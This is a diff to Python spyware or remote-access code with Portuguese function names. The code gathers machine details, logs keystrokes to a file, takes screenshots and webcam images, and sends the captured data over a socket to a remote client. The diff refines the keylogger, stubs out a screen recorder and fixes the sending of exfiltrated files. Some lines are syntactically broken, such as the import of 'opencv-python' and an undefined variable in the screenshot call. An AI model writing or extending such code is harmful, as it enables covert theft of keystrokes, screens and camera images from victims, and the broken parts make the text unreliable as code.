@@ -1,9 +1,6 @@
-import socket, platform, os
-import keyboard
-import pygame
+import socket, platform, os, keyboard, pygame, numpy, opencv-python, pyautogui
 
 # ========= FUNCOES DE DESCOBERTA =========
-
 def detalhes_da_maquina(cliente):
     mensagem = "\nSistema: {}\nNó: {}\nRelease: {}\nVersão: {}\nBits do processador: {}".format(platform.system(),
     platform.node(),platform.release(),platform.version(),platform.processor())
@@ -34,6 +31,8 @@ def keylogger(cliente):
                 salvar = ' '
             elif(v4[0] == 'enter'):
                 salvar = '\n'
+            elif(v4[0] == 'esc'):
+                salvar = ' esc'
             else:
                 salvar = v4[0]
             arquivo = open('log.txt','a')
@@ -41,6 +40,9 @@ def keylogger(cliente):
     arquivo.close()
     enviar_arquivo(cliente,'log.txt')
     os.remove('log.txt')
+
+def screen_recorder():
+    pass
 
 def screenshot(cliente):
     fig = pyautogui.screenshot(r)
@@ -62,8 +64,8 @@ def webcam():
 
 def enviar_arquivo(cliente,dir):
     arquivo = open(dir,"r")
-    data = arquivo.readlines()
-    cliente.send(data)
+    data = str(arquivo.readlines())
+    cliente.send(data.encode())
     arquivo.close()
 
 def comando_nao_reconhecido(cliente):
